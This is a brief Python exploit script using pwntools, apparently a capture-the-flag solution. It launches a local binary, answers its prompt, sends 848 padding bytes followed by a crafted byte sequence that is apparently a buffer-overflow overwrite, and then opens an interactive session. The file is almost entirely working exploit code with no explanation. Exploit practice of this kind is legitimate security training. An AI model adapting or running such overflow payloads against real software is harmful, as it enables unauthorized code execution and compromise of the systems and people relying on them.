from pwn import *
import sys

class io:
    @classmethod
    def connect(cls):
        cls.io = process('/pwn/' + sys.argv[0].split('.py')[0])
    @classmethod
    def readuntil(cls, x, timeout = 5):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()


def main():
    io.connect()

    pl = '\x5a'*4
    pl += '\xca'*3
    pl += '\x74'*3
    pl += '\xd6'*3
    pl += '\xa4'*3
    pl += '\xd6'*3
    pl += '\x6a'*3
    pl += '\xae'*3

    io.readuntil('? ')
    io.sendline('1000')
    io.readuntil('!')
    io.sendline('A'*848 + pl)

if __name__ == '__main__':
    main()
    io.interactive()
